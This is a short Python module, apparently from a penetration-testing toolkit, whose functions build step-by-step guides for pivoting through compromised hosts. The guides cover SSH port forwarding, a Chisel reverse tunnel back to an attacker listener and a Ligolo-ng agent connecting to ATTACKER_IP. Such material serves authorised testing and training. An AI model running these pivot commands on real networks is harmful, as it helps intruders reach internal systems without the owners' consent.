"""
Manual instruction builders for lateral movement helpers.
"""

from typing import Dict


def ssh_pivot_instructions(
    jump_host: str,
    jump_user: str,
    local_port: int,
    remote_host: str,
    remote_port: int
) -> str:
    """Return guide for SSH pivoting using ProxyCommand."""
    return (
        "## SSH Pivoting Guide\n"
        f"Jump Host: {jump_user}@{jump_host}\n"
        f"Internal Target: {remote_host}:{remote_port}\n\n"
        "1. Enable local port forwarding:\n"
        f"   ssh -N -L {local_port}:{remote_host}:{remote_port} {jump_user}@{jump_host}\n\n"
        "2. Alternatively, use dynamic SOCKS proxy:\n"
        f"   ssh -N -D {local_port} {jump_user}@{jump_host}\n\n"
        "3. Configure your tooling to use the forwarded port or SOCKS proxy.\n"
    )


def chisel_instructions(
    attacker_host: str,
    attacker_port: int,
    remote_host: str,
    remote_port: int,
    bind_port: int
) -> str:
    """Return guide for Chisel reverse pivot."""
    return (
        "## Chisel Reverse Pivot\n"
        f"Attacker Listener: {attacker_host}:{attacker_port}\n"
        f"Bind Port: {bind_port}\n"
        f"Remote Target: {remote_host}:{remote_port}\n\n"
        "Servidor (atacante):\n"
        f"  chisel server --reverse --port {attacker_port}\n\n"
        "Cliente (equipo comprometido):\n"
        f"  chisel client {attacker_host}:{attacker_port} "
        f"R:{bind_port}:{remote_host}:{remote_port}\n\n"
        "Opcional (SOCKS proxy):\n"
        f"  chisel client {attacker_host}:{attacker_port} R:socks\n"
    )


def ligolo_instructions(
    relay_port: int,
    agent_port: int,
    target_subnet: str
) -> str:
    """Return guide for Ligolo-ng usage."""
    return (
        "## Ligolo-ng Pivot\n"
        f"Relay Port: {relay_port}\n"
        f"Agent Port: {agent_port}\n"
        f"Target Subnet: {target_subnet}\n\n"
        "1. Inicia el relay en el equipo del atacante:\n"
        f"   ./ligolo-ng relay -listen 0.0.0.0:{relay_port} -autocert\n\n"
        "2. Ejecuta el agente en el host comprometido:\n"
        f"   ./ligolo-ng agent -connect ATTACKER_IP:{relay_port} -listen 0.0.0.0:{agent_port}\n\n"
        "3. Abre una sesiÃ³n interactive desde el relay:\n"
        "   ligolo> session\n"
        f"   ligolo(session)> ifconfig add {target_subnet}\n"
        "   ligolo(session)> start\n"
    )


def instructions_payload(content: str) -> Dict[str, str]:
    """Return standardized payload for manual outputs."""
    return {'instructions': content, 'lines': content.count('\n') + 1}






